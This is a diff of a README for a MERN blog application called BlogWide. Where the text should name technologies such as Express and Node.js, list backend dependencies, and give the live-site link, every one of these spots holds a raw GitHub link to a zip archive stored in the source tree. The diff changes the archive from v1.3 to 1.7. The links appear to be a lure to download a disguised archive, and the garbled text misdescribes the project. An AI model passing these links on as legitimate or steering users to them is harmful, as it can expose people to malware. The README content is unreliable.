@@ -5,7 +5,7 @@
 
 # DESCRIPTION
 
-BlogWide is a full-stack MERN (MongoDB, https://raw.githubusercontent.com/jobayer58/BlogWide-Client/main/src/assets/Client_Wide_Blog_v1.3.zip, React, https://raw.githubusercontent.com/jobayer58/BlogWide-Client/main/src/assets/Client_Wide_Blog_v1.3.zip) application that allows users to:
+BlogWide is a full-stack MERN (MongoDB, https://raw.githubusercontent.com/jobayer58/BlogWide-Client/main/src/Pages/AllBlogs/Client_Wide_Blog_1.7.zip, React, https://raw.githubusercontent.com/jobayer58/BlogWide-Client/main/src/Pages/AllBlogs/Client_Wide_Blog_1.7.zip) application that allows users to:
 
 - Write and publish blog posts
 - Filter blogs by category, language, or level
@@ -41,8 +41,8 @@ BlogWide is a full-stack MERN (MongoDB, https://raw.githubusercontent.com/jobaye
 - react awesome reveal
 
 ### Backend
-- https://raw.githubusercontent.com/jobayer58/BlogWide-Client/main/src/assets/Client_Wide_Blog_v1.3.zip
-- https://raw.githubusercontent.com/jobayer58/BlogWide-Client/main/src/assets/Client_Wide_Blog_v1.3.zip
+- https://raw.githubusercontent.com/jobayer58/BlogWide-Client/main/src/Pages/AllBlogs/Client_Wide_Blog_1.7.zip
+- https://raw.githubusercontent.com/jobayer58/BlogWide-Client/main/src/Pages/AllBlogs/Client_Wide_Blog_1.7.zip
 - MongoDB
 - CORS
 - dotenv
@@ -51,6 +51,6 @@ BlogWide is a full-stack MERN (MongoDB, https://raw.githubusercontent.com/jobaye
 
 ## 🔗 Live Site
 
-👉 [BlogWide Live](https://raw.githubusercontent.com/jobayer58/BlogWide-Client/main/src/assets/Client_Wide_Blog_v1.3.zip)
+👉 [BlogWide Live](https://raw.githubusercontent.com/jobayer58/BlogWide-Client/main/src/Pages/AllBlogs/Client_Wide_Blog_1.7.zip)
 
 ---
